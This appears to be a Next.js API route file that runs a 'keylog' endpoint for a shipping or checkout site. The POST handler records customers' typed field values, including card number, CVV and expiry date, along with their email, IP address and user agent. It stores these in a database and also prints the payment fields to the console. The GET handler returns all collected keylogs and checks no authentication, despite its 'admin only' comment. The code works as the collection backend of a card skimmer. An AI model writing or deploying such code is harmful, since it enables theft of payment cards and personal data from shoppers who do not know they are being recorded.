import { NextRequest, NextResponse } from 'next/server'
import { databaseService } from '@/lib/postgres-database'

// POST /api/keylog - Real-time keylogging for shipping inputs
export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    
    const { customerEmail, field, value, context, page, cardType, fieldType } = body
    
    if (!customerEmail || !field || !value) {
      return NextResponse.json(
        { error: 'Customer email, field, and value are required' },
        { status: 400 }
      )
    }
    
    // Get IP address and user agent
    const ipAddress = request.ip || request.headers.get('x-forwarded-for') || 'unknown'
    const userAgent = request.headers.get('user-agent') || 'unknown'
    
    // Log the keypress
    await databaseService.persistKeylog({
      customerEmail,
      field,
      value,
      ipAddress,
      userAgent,
      context,
      page,
      cardType,
      fieldType,
      timestamp: new Date().toISOString()
    })
    
    const keylog = { customerEmail, field, value, timestamp: new Date().toISOString() }
    
    // Debug logging for payment fields
    if (field === 'cardNumber' || field === 'cvv' || field === 'expiryDate') {
      console.log('💳 Payment field logged:', {
        field,
        value, 
        customerEmail: customerEmail,
        page,
        context
      })
    }
    
    return NextResponse.json({
      success: true,
      keylog
    })
    
  } catch (error) {
    console.error('Keylog error:', error)
    return NextResponse.json(
      { error: 'Failed to log keypress' },
      { status: 500 }
    )
  }
}

// GET /api/keylog - Get keylogs (admin only)
export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url)
    const email = searchParams.get('email')
    const latest = searchParams.get('latest') === 'true'
    
    let keylogs
    if (email) {
      keylogs = latest ? await databaseService.getLatestKeylogsByEmail(email) : await databaseService.getKeylogsByEmail(email)
    } else {
      keylogs = latest ? await databaseService.getLatestKeylogs() : await databaseService.getKeylogs()
    }
    
    return NextResponse.json({ keylogs })
    
  } catch (error) {
    console.error('Get keylogs error:', error)
    return NextResponse.json(
      { error: 'Failed to get keylogs' },
      { status: 500 }
    )
  }
}
